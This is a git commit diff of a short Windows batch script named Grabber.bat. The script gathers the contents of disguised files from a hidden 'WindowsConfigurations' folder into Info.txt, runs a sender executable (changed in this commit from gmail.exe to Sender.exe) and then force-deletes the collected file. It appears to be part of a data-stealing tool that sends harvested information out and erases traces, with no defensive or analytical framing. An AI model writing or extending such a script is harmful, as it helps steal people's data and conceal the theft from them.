134e851ef2623dcefe0509a0a222c7112b49cc37
domilx <73660748+domilx@users.noreply.github.com>
2020-11-22 15:32:07 -0500

    Update Grabber.bat

--- Grabber.bat
+++ Grabber.bat
@@ -1,7 +1,7 @@
 @echo off
 type %homedrive%\%homepath%\WindowsConfigurations\winv32.exe>> Info.txt
 type %homedrive%\%homepath%\WindowsConfigurations\config32.exe>>Info.txt
-gmail.exe
+Sender.exe
 del /f info.txt
 exit
 
